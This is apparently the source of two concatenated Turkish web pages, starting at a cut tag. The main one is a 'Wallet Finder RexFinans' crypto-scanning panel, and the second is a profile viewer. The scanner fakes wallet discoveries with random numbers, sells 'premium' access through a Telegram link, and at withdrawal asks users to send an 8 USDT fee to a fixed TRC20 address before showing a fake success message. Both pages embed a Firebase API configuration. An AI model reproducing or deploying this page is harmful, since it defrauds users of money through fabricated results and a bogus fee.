 </st<!DOCTYPE html>
<html lang="tr">
<head>
<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-7880815739817256"
     crossorigin="anonymous"></script>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Kripto Tarama Paneli - Premium Kilit</title>
<style>
.profile-container {
  position: fixed;
  top: 10%;
  right: 10%;
  background: white;
  border: 1px solid #ccc;
  padding: 20px;
  width: 320px;
  box-shadow: 0 2px 10px rgba(0,0,0,0.1);
  border-radius: 8px;
  z-index: 1000;
}

.profile-container h2, .profile-container h3 {
  margin-top: 0;
}

.profile-container ul {
  max-height: 150px;
  overflow-y: auto;
  padding-left: 20px;
  margin-top: 5px;
}

.profile-container button {
  margin-top: 15px;
  padding: 8px 12px;
  cursor: pointer;
}


#balanceContainer {
  position: relative;
  display: inline-block;
  font-size: 1.5rem;
  font-weight: bold;
  margin-bottom: 15px;
}

#balanceGain {
  position: absolute;
  left: 60px;
  top: -20px;
  color: green;
  font-weight: bold;
  opacity: 0;
  transition: opacity 0.5s ease, transform 0.5s ease;
  transform: translateY(0);
  pointer-events: none;
  user-select: none;
  font-size: 1rem;
}

#balanceGain.show {
  opacity: 1;
  transform: translateY(-20px);
}

  body {
    background: #181a29;
    color: #eee;
    font-family: Arial, sans-serif;
    padding: 20px;
    text-align: center;
  }
  header {
    margin-bottom: 30px;
  }
header h1.blinking-title {
  font-weight: 900;
  font-size: 3rem;
  text-transform: uppercase;
  color: #00bfff;
  text-shadow:
    0 0 5px #00bfff,
    0 0 10px #00bfff,
    0 0 20px #00bfff,
    0 0 40px #00bfff,
    0 0 80px #00bfff;
  animation: neonBlink 1.8s ease-in-out infinite alternate;
}

@keyframes neonBlink {
  0%, 100% {
    opacity: 1;
    text-shadow:
      0 0 5px #00bfff,
      0 0 10px #00bfff,
      0 0 20px #00bfff,
      0 0 40px #00bfff,
      0 0 80px #00bfff;
  }
  50% {
    opacity: 0.5;
    text-shadow: none;
  }
}

  button, select, input {
    padding: 10px;
    margin: 8px;
    border-radius: 5px;
    border: none;
    font-weight: bold;
  }
  button {
    background: #7a5ef0;
    color: white;
    cursor: pointer;
  }
  button:disabled {
    background: #444;
    cursor: default;
  }
  #coinContainer {
    margin: 20px 0;
    display: flex;
    flex-wrap: wrap;
    justify-content: center;
    gap: 10px;
  }
  label {
    user-select: none;
    padding: 8px 15px;
    border-radius: 8px;
    cursor: pointer;
    background: #444;
    color: #ccc;
  }
  input[type=checkbox] {
    display: none;
  }
  input[type=checkbox]:checked + label {
    background: #1abc9c;
    color: white;
    box-shadow: 0 0 8px #1abc9c;
  }
  input.locked + label {
    cursor: not-allowed;
    background: #222 !important;
    color: #666 !important;
    position: relative;
  }
  input.locked + label::after {
    content: "\1F512";
    position: absolute;
    right: 6px;
    top: 6px;
  }
  #scanOutput {
    background: #222;
    color: #1abc9c;
    margin: 15px auto;
    max-width: 600px;
    height: 180px;
    overflow-y: auto;
    padding: 12px;
    border-radius: 10px;
    text-align: left;
    white-space: pre-wrap;
    font-family: monospace;
  }
  #withdrawSection {
    margin-top: 25px;
  }
  #withdrawMessage {
    margin-top: 8px;
    height: 40px;
    font-weight: bold;
    color: #ff5555;
    white-space: pre-line;
  }
  #unlockSection {
    margin-bottom: 20px;
  }
  #passwordInput {
    padding: 10px;
    border-radius: 5px;
    border: none;
    font-weight: bold;
    width: 180px;
    margin-right: 8px;
  }
  #getPasswordBtn {
    background: #16a085;
    color: white;
  }
</style>

</head>
<body>

<header>
  <h1 class="blinking-title">WALLET FÄ°NDER REXFÄ°NANS</h1>
</header>


<div id="unlockSection">
  <input type="password" id="passwordInput" placeholder="Premium Åžifre Girin" />
  <button id="unlockPremiumBtn">Premium Kilidini AÃ§</button>
  <button class="premium-button" onclick="window.location.href='Ã¶deme.html'">Premium Paket SatÄ±n Al</button>
  <button id="getPasswordBtn">Åžifre Al</button>
</div>

<div>
  <select id="speedSelect" disabled>
    <option value="2" selected>2x (Ãœcretsiz)</option>
    <option value="14">10x (Premium)</option>
    <option value="20">20x (Premium)</option>
    <option value="30">30x (Premium)</option>
  </select>
</div>

<div id="coinContainer"></div>

<div>
  <button id="startScan">TaramayÄ± BaÅŸlat</button>
  <button id="stopScan" disabled>TaramayÄ± Durdur</button>
</div>

<pre id="scanOutput"></pre>

<button id="loadHistoryBtn">Tarama GeÃ§miÅŸini GÃ¶ster</button>
<div id="historyOutput" style="margin-top:10px;"></div>

<div id="withdrawSection">
  <h2>Para Ã‡ekme</h2>
  <input type="text" id="withdrawAddress" placeholder="TRC20 USDT CÃ¼zdan Adresi" />
  <input type="number" id="withdrawAmount" placeholder="Ã‡ekilecek Miktar (Min 50 USDT)" min="50" />
  <button id="withdrawBtn">Para Ã‡ek</button>
  <div id="withdrawMessage"></div>
  <p>Bakiye: <span id="balance">0.0000</span> USDT</p>
</div>

<script type="module">
import { initializeApp } from "https://www.gstatic.com/firebasejs/9.22.2/firebase-app.js";
import {
  getFirestore, doc, getDoc, updateDoc, serverTimestamp,
  collection, setDoc, getDocs, query, where, orderBy
} from "https://www.gstatic.com/firebasejs/9.22.2/firebase-firestore.js";

const firebaseConfig = {
  apiKey: "AIzaSyBXddctTbfBzgJ9sgtVCvSMtNJRd3JVeHs",
  authDomain: "crypto-eccb4.firebaseapp.com",
  projectId: "crypto-eccb4",
  storageBucket: "crypto-eccb4.appspot.com",
  messagingSenderId: "773649197313",
  appId: "1:773649197313:web:18da6ed3ee63353c4e9300",
  measurementId: "G-B8D9V0V9XE"
};

const app = initializeApp(firebaseConfig);
const db = getFirestore(app);

const coins = ["TRX", "USDT", "BTC", "BNB", "ETH", "ADA", "SOL", "DOT", "DOGE", "XRP", "LTC", "AVAX"];
const coinContainer = document.getElementById('coinContainer');
const startScanBtn = document.getElementById('startScan');
const stopScanBtn = document.getElementById('stopScan');
const scanOutput = document.getElementById('scanOutput');
const withdrawBtn = document.getElementById('withdrawBtn');
const withdrawAddress = document.getElementById('withdrawAddress');
const withdrawAmount = document.getElementById('withdrawAmount');
const withdrawMessage = document.getElementById('withdrawMessage');
const balanceSpan = document.getElementById('balance');
const speedSelect = document.getElementById('speedSelect');
const unlockBtn = document.getElementById("unlockPremiumBtn");
const passwordInput = document.getElementById("passwordInput");
const getPasswordBtn = document.getElementById("getPasswordBtn");
const historyBtn = document.getElementById('loadHistoryBtn');
const historyOutput = document.getElementById('historyOutput');

let scanInterval = null;
let balance = 0;
let premiumUnlocked = false;
const freeCoinsCount = 5;

let userId = localStorage.getItem("userId");
if (!userId) {
  userId = 'user_' + Math.random().toString(36).substring(2, 10);
  localStorage.setItem("userId", userId);
}

function createCoinCheckboxes() {
  coinContainer.innerHTML = '';
  coins.forEach((coin, idx) => {
    const checkbox = document.createElement('input');
    checkbox.type = 'checkbox';
    checkbox.id = `coin_${idx}`;
    checkbox.value = coin;
    checkbox.name = 'coinSelect';

    if (idx >= freeCoinsCount && !premiumUnlocked) {
      checkbox.classList.add('locked');
      checkbox.disabled = true;
    } else {
      if (idx < freeCoinsCount) checkbox.checked = true;
      checkbox.disabled = false;
    }

    const label = document.createElement('label');
    label.htmlFor = checkbox.id;
    label.textContent = coin;

    coinContainer.appendChild(checkbox);
    coinContainer.appendChild(label);
  });
}

createCoinCheckboxes();

(async () => {
  const ref = doc(db, "balances", userId);
  const snap = await getDoc(ref);
  if (snap.exists()) {
    balance = snap.data().amount;
    balanceSpan.textContent = balance.toFixed(4);
  }
})();

unlockBtn.onclick = async () => {
  const pass = passwordInput.value.trim();
  if (!pass) return alert("LÃ¼tfen ÅŸifre girin.");

  try {
    const passRef = doc(db, "premiumPasswords", pass);
    const docSnap = await getDoc(passRef);

    if (!docSnap.exists()) {
      alert("Åžifre yanlÄ±ÅŸ veya bulunamadÄ±.");
      return;
    }

    const data = docSnap.data();

    if (data.usedBy && data.usedBy !== userId) {
      alert("Bu ÅŸifre baÅŸka biri tarafÄ±ndan zaten kullanÄ±lmÄ±ÅŸ.");
      return;
    }

    if (!data.usedBy) {
      await updateDoc(passRef, {
        usedBy: userId,
        usedAt: serverTimestamp()
      });
    }

    premiumUnlocked = true;
    alert("âœ… Premium kilidi aÃ§Ä±ldÄ±!");
    speedSelect.disabled = false;
    createCoinCheckboxes();
    passwordInput.value = "";
  } catch (err) {
    alert("Hata: " + err.message);
  }
};

getPasswordBtn.onclick = () => {
  window.open("https://t.me/rexfinans", "_blank");
};

function generateMaskedWallet() {
  const full = crypto.randomUUID().replace(/-/g, '');
  return full.substring(0, 12) + '****';
}

function scanStep() {
  const selectedCoins = Array.from(document.querySelectorAll('input[name="coinSelect"]:checked')).map(c => c.value);
  if (selectedCoins.length === 0) {
    scanOutput.textContent += "\nLÃ¼tfen en az bir coin seÃ§in.\n";
    return;
  }

  const randomCoin = selectedCoins[Math.floor(Math.random() * selectedCoins.length)];
  const found = Math.random() < 0.10;
  const maskedWallet = generateMaskedWallet();
  const result = found ? "BULUNDU! ðŸ’°" : "bulunamadÄ±";

  const line = `+${randomCoin}: CÃ¼zdan: ${maskedWallet} ${result}\n`;
  scanOutput.textContent += line;
  scanOutput.scrollTop = scanOutput.scrollHeight;

  if (found) {
    const earned = Math.random() * 0.015 + 0.005;
    balance += earned;
    balanceSpan.textContent = balance.toFixed(4);

const gainEl = document.getElementById("balanceGain");
gainEl.textContent = `+${earned.toFixed(4)}`;
gainEl.classList.add("show");
setTimeout(() => {
  gainEl.classList.remove("show");
}, 1500);

    // Firestore'a bakiye yaz
    setDoc(doc(db, "balances", userId), { amount: balance });

    // Firestore'a geÃ§miÅŸe yaz
    setDoc(doc(db, "scanLogs", `${userId}_${Date.now()}`), {
      userId,
      coin: randomCoin,
      amount: earned,
      time: new Date().toISOString()
    });
  }
}


startScanBtn.onclick = () => {
  const speed = parseInt(speedSelect.value);
  if (scanInterval) clearInterval(scanInterval);
  scanInterval = setInterval(scanStep, 1500 / speed);
  startScanBtn.disabled = true;
  stopScanBtn.disabled = false;
};

stopScanBtn.onclick = () => {
  if (scanInterval) clearInterval(scanInterval);
  startScanBtn.disabled = false;
  stopScanBtn.disabled = true;
};

withdrawBtn.onclick = () => {
  withdrawMessage.style.color = "#ff5555";
  const addr = withdrawAddress.value.trim();
  const amount = parseFloat(withdrawAmount.value);

  if (addr.length < 10) {
    withdrawMessage.textContent = "LÃ¼tfen geÃ§erli bir cÃ¼zdan adresi girin.";
    return;
  }
  if (isNaN(amount) || amount < 50) {
    withdrawMessage.textContent = "Minimum Ã§ekim miktarÄ± 50 USDT'dir.";
    return;
  }
  if (amount + 8 > balance) {
    withdrawMessage.textContent = "Yetersiz bakiye.";
    return;
  }

  withdrawMessage.style.color = "#ffaa00";
  withdrawMessage.textContent = "LÃ¼tfen aÅŸaÄŸÄ±daki adrese 8 USDT iÅŸlem Ã¼creti gÃ¶nderin:\nTRC20\nTPHNV2S6d5oFJarPVju2XV2xBkwDbbyjaH";

  setTimeout(() => {
    balance -= (amount + 8);
    balanceSpan.textContent = balance.toFixed(4);
    withdrawMessage.style.color = "#55ff55";
    withdrawMessage.textContent = `BaÅŸarÄ±yla ${amount.toFixed(4)} USDT Ã§ekildi (8 USDT Ã¼cret kesildi).`;
    withdrawAmount.value = "";
    withdrawAddress.value = "";
    setDoc(doc(db, "balances", userId), { amount: balance });
  }, 3000);
};

historyBtn.onclick = async () => {
  historyOutput.innerHTML = "â³ YÃ¼kleniyor...";
  const q = query(collection(db, "scanLogs"), where("userId", "==", userId), orderBy("time", "desc"));
  const snapshot = await getDocs(q);
  if (snapshot.empty) {
    historyOutput.innerHTML = "HenÃ¼z tarama geÃ§miÅŸi yok.";
    return;
  }
  let html = "";
  snapshot.forEach(doc => {
    const d = doc.data();
    html += `<div>[${new Date(d.time).toLocaleString()}] ${d.coin}: +${d.amount.toFixed(4)} USDT</div>`;
  });
  historyOutput.innerHTML = html;
};
</script>
</body>
</html>
<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8" />
  <title>Profil ve Ã‡ekim GeÃ§miÅŸi</title>
  <style>
    /* CSS kodlarÄ±nÄ± buraya yapÄ±ÅŸtÄ±r */
    .profile-container {
      position: fixed;
      top: 10%;
      right: 10%;
      background: white;
      border: 1px solid #ccc;
      padding: 20px;
      width: 320px;
      box-shadow: 0 2px 10px rgba(0,0,0,0.1);
      border-radius: 8px;
      z-index: 1000;
    }
    .profile-container h2, .profile-container h3 {
      margin-top: 0;
    }
    .profile-container ul {
      max-height: 150px;
      overflow-y: auto;
      padding-left: 20px;
      margin-top: 5px;
    }
    .profile-container button {
      margin-top: 15px;
      padding: 8px 12px;
      cursor: pointer;
    }
  </style>
</head>
<body>
<!-- Profil kÄ±smÄ± -->
<div id="userProfile" style="display:none; border:1px solid #ccc; padding:10px; max-width:400px;">
  <h2>Profil Bilgileri</h2>
  <p><strong>Email:</strong> <span id="profileEmail"></span></p>
  <p><strong>KayÄ±t Tarihi:</strong> <span id="profileJoinDate"></span></p>

  <button id="closeProfileBtn">Kapat</button>
</div>

<button id="profileBtn">Profilim</button>

<script type="module">
  import { initializeApp } from "https://www.gstatic.com/firebasejs/9.22.1/firebase-app.js";
  import { getFirestore, doc, getDoc } from "https://www.gstatic.com/firebasejs/9.22.1/firebase-firestore.js";
  import { getAuth, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/9.22.1/firebase-auth.js";

  // Firebase yapÄ±landÄ±rma bilgilerin
  const firebaseConfig = {
    apiKey: "AIzaSyBXddctTbfBzgJ9sgtVCvSMtNJRd3JVeHs",
    authDomain: "crypto-eccb4.firebaseapp.com",
    projectId: "crypto-eccb4",
    storageBucket: "crypto-eccb4.firebasestorage.app",
    messagingSenderId: "773649197313",
    appId: "1:773649197313:web:18da6ed3ee63353c4e9300",
    measurementId: "G-B8D9V0V9XE"
  };

  // Firebase baÅŸlat
  const app = initializeApp(firebaseConfig);
  const db = getFirestore(app);
  const auth = getAuth(app);

  let currentUserId = null;

  // KullanÄ±cÄ± oturum durumunu dinle
  onAuthStateChanged(auth, user => {
    if (user) {
      currentUserId = user.uid;
      console.log("GiriÅŸ yapan kullanÄ±cÄ± UID:", currentUserId);
    } else {
      currentUserId = null;
      console.log("KullanÄ±cÄ± Ã§Ä±kÄ±ÅŸ yaptÄ±");
      document.getElementById("userProfile").style.display = "none";
    }
  });

  // Profil verisini Firestore'dan Ã§ek ve ekrana yaz
  async function loadUserProfile(userId) {
    try {
      const userDocRef = doc(db, "users", userId);
      const userDocSnap = await getDoc(userDocRef);

      if (!userDocSnap.exists()) {
        alert("KullanÄ±cÄ± bulunamadÄ±.");
        return;
      }

      const userData = userDocSnap.data();

      // KayÄ±t tarihini biÃ§imlendir
      const regDate = userData.registeredAt ? userData.registeredAt.toDate().toLocaleString() : "Bilinmiyor";

      // Profil bilgilerini DOM'a yaz
      document.getElementById("profileEmail").textContent = userData.email || "Bilinmiyor";
      document.getElementById("profileJoinDate").textContent = regDate;

      // Profil bÃ¶lÃ¼mÃ¼nÃ¼ gÃ¶ster
      document.getElementById("userProfile").style.display = "block";

    } catch (error) {
      console.error("Profil yÃ¼klenirken hata:", error);
      alert("Profil yÃ¼klenirken hata oluÅŸtu.");
    }
  }

  // Profil butonuna tÄ±klandÄ±ÄŸÄ±nda
  document.getElementById("profileBtn").addEventListener("click", () => {
    if (!currentUserId) {
      alert("LÃ¼tfen giriÅŸ yapÄ±nÄ±z.");
      return;
    }
    loadUserProfile(currentUserId);
  });

  // Profil kapatma butonu
  document.getElementById("closeProfileBtn").addEventListener("click", () => {
    document.getElementById("userProfile").style.display = "none";
  });
</script>

